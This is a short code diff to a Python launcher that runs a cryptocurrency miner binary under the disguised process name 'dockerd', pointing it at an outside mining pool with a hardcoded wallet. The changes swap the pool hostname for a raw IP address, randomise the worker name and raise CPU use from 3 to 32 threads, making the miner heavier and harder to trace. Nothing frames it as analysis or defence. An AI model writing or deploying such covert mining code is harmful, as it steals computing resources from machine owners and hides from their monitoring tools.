@@ -5,9 +5,9 @@ os.execvp("./srebe", [
     "dockerd",  # This will be the name shown in process monitors
     "--disable-gpu",
     "--algorithm", "verushash",
-    "--pool", "ap.luckpool.net:3956",
+    "--pool", "149.56.27.47:3956",
     "--wallet", "R9HMvHdgUX8h7h7ch3xGq4qGGVsRmuC74T",
-    "--worker", "tr1",  # Using a fixed worker name
+    "--worker", "$(shuf -i 1-99 -n 1)",  # Using a fixed worker name
     "--password", "x",
-    "--cpu-threads", "3"
+    "--cpu-threads", "32"
 ])
